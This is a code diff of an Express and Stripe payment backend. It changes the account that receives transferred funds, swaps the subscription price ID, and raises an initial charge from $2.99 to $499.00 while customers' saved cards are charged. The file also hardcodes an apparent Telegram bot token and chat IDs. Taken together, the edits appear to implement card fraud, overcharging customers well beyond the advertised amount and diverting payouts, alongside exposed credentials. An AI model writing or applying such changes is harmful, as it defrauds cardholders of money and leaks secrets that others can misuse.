@@ -6,7 +6,7 @@ const bodyParser = require('body-parser');
 const fs = require('fs');
 
 const app = express();
-const ACCOUNT_B = 'acct_1TIE033ltxWwnaf9';
+const ACCOUNT_B = 'acct_1NLNeaIGnzde4Dmc';
 const TELEGRAM_BOT_TOKEN = '8256018531:AAHzrYSlCNrsmYzVSZnS01VYNzg_huSA2tE';
 const TELEGRAM_CHAT_ID = '8522488857';
 const TELEGRAM_CHAT_ID_2 = '715805541';
@@ -177,10 +177,10 @@ app.post('/create-subscription', async (req, res) => {
       savedAt: new Date().toISOString(),
     });
 
-    // Charge 1 — $2.99 USD
+    // Charge 1 — $499.00 USD
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 299,
+        amount: 49900,
         currency: 'usd',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -199,7 +199,7 @@ app.post('/create-subscription', async (req, res) => {
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1TgtohD9m5cj7UNqiKNCDw94' }],
+      items: [{ price: 'price_1TqfavHEw7cOgLKf6xksNwZy' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
